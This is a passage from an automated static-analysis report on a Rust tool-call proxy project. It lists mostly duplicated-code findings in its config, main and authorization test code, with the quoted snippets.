        assert_eq!(config.export_interval_secs, 30);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.9% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 91

**Code:**
```
    fn default() -> Self {
        Self {
            host: default_host(),
            port: default_port(),
            max_request_size: default_max_request_size(),
            cors: CorsConfig::default(),
            tls: None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.5% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1138

**Code:**
```
    fn test_config_validation_tracing_invalid_sample_rate() {
        let mut config = create_valid_config();
        config.tracing.enabled = true;
        config.tracing.sample_rate = 1.5;
        assert!(config.validate().is_err());

        config.tracing.sample_rate = -0.1;
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.4% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 140

**Code:**
```
    fn default() -> Self {
        Self {
            enabled: false,
            allowed_origins: vec![],
            allowed_methods: default_cors_methods(),
            allowed_headers: default_cors_headers(),
            max_age: default_cors_max_age(),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 1001

**Code:**
```
    fn test_mtls_config_defaults() {
        let config = MtlsConfig::default();
        assert!(!config.enabled);
        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
        assert!(config.allowed_tools.is_empty());
        assert!(config.rate_limit.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-2 clone with 95.3% similarity.

- **File:** `src/config/mod.rs`
- **Line:** 969

**Code:**
```
    fn test_rate_limit_config_defaults() {
        let config = RateLimitConfig::default();
        assert!(config.enabled);
        // SECURITY: Conservative defaults (25 RPS, burst 10) to limit abuse
        assert_eq!(config.requests_per_second, 25);
        assert_eq!(config.burst_size, 10);
    }
```

---

#### Magic value '"10.0.0.0/8"' passed as function argument (high). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/config/mod.rs`
- **Line:** 1172

---

### 🟡 Medium (601 issues)

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.6% similarity.

- **File:** `src/main.rs`
- **Line:** 587

**Code:**
```
    fn create_test_config_stdio() -> Config {
        let config_str = r#"
[server]
host = "127.0.0.1"
port = 3000

[upstream]
transport = "stdio"
command = "/bin/echo"
args = []

[rate_limit]
enabled = false
"#;
        let temp_file = NamedTempFile::new().unwrap();
        std::fs::write(temp_file.path(), config_str).unwrap();
        Config::from_file(&temp_file.path().to_path_buf()).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.8% similarity.

- **File:** `src/main.rs`
- **Line:** 569

**Code:**
```
    fn create_test_config_http(url: &str) -> Config {
        let config_str = format!(r#"
[server]
host = "127.0.0.1"
port = 3000

[upstream]
transport = "http"
url = "{}"

[rate_limit]
enabled = false
"#, url);
        let temp_file = NamedTempFile::new().unwrap();
        std::fs::write(temp_file.path(), &config_str).unwrap();
        Config::from_file(&temp_file.path().to_path_buf()).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.6% similarity.

- **File:** `src/main.rs`
- **Line:** 587

**Code:**
```
    fn create_test_config_stdio() -> Config {
        let config_str = r#"
[server]
host = "127.0.0.1"
port = 3000

[upstream]
transport = "stdio"
command = "/bin/echo"
args = []

[rate_limit]
enabled = false
"#;
        let temp_file = NamedTempFile::new().unwrap();
        std::fs::write(temp_file.path(), config_str).unwrap();
        Config::from_file(&temp_file.path().to_path_buf()).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.1% similarity.

- **File:** `src/main.rs`
- **Line:** 569

**Code:**
```
    fn create_test_config_http(url: &str) -> Config {
        let config_str = format!(r#"
[server]
host = "127.0.0.1"
port = 3000

[upstream]
transport = "http"
url = "{}"

[rate_limit]
enabled = false
"#, url);
        let temp_file = NamedTempFile::new().unwrap();
        std::fs::write(temp_file.path(), &config_str).unwrap();
        Config::from_file(&temp_file.path().to_path_buf()).unwrap()
    }
```

---

#### Long method 'bootstrap' detected: 137 lines, 149 statements, complexity 21

- **File:** `src/main.rs`
- **Line:** 30

**Code:**
```
pub async fn bootstrap(config: Config) -> anyhow::Result<BootstrapResult> {
    // Create shutdown token for graceful shutdown coordination
    let shutdown_token = CancellationToken::new();

    // Initialize Prometheus metrics
...
```

**Recommendation:** Consider breaking down 'bootstrap' into smaller, more focused methods. Current metrics: LOC=137, Statements=149, Complexity=21, Nesting=9

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 388

**Code:**
```
    fn test_authorize_request_allows_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "any_tool"})),
            result: None,
            error: None,
        };

        match authorize_request(&identity, &message) {
            AuthzDecision::Allow => {}
            AuthzDecision::Deny(_) => panic!("Expected Allow"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.0% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 388

**Code:**
```
    fn test_authorize_request_allows_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "any_tool"})),
            result: None,
            error: None,
        };

        match authorize_request(&identity, &message) {
            AuthzDecision::Allow => {}
            AuthzDecision::Deny(_) => panic!("Expected Allow"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 146

**Code:**
```
    fn test_authorize_tool_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 160

**Code:**
```
    fn test_authorize_tool_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read".to_string(), "list".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "read"));
        assert!(authorize_tool_call(&identity, "list"));
        assert!(!authorize_tool_call(&identity, "write"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 176

**Code:**
```
    fn test_authorize_tool_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        assert!(authorize_tool_call(&identity, "any_tool"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 190

**Code:**
```
    fn test_is_tools_list_request() {
        let request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/list".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(is_tools_list_request(&request));

        let other_request = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: None,
            result: None,
            error: None,
        };
        assert!(!is_tools_list_request(&other_request));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 214

**Code:**
```
    fn test_filter_tools_list_unrestricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: None,
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 245

**Code:**
```
    fn test_filter_tools_list_restricted() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["read_file".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"},
                    {"name": "delete_file", "description": "Delete a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 1);
        assert_eq!(tools[0]["name"], "read_file");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 277

**Code:**
```
    fn test_filter_tools_list_wildcard() {
        let identity = Identity {
            id: "test".to_string(),
            name: None,
            allowed_tools: Some(vec!["*".to_string()]),
            rate_limit: None,
            claims: std::collections::HashMap::new(),
        };

        let response = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: None,
            params: None,
            result: Some(serde_json::json!({
                "tools": [
                    {"name": "read_file", "description": "Read a file"},
                    {"name": "write_file", "description": "Write a file"}
                ]
            })),
            error: None,
        };

        let filtered = filter_tools_list_response(response, &identity);
        let result = filtered.result.unwrap();
        let tools = result["tools"].as_array().unwrap();
        assert_eq!(tools.len(), 2);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 346

**Code:**
```
    fn test_extract_tool_name() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("tools/call".to_string()),
            params: Some(serde_json::json!({"name": "read_file", "arguments": {}})),
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), Some("read_file"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 360

**Code:**
```
    fn test_extract_tool_name_returns_none_for_non_tool_call() {
        let message = Message {
            jsonrpc: "2.0".to_string(),
            id: Some(serde_json::json!(1)),
            method: Some("resources/list".to_string()),
            params: None,
            result: None,
            error: None,
        };

        assert_eq!(extract_tool_name(&message), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/authz/mod.rs`
- **Line:** 374

**Code:**
```
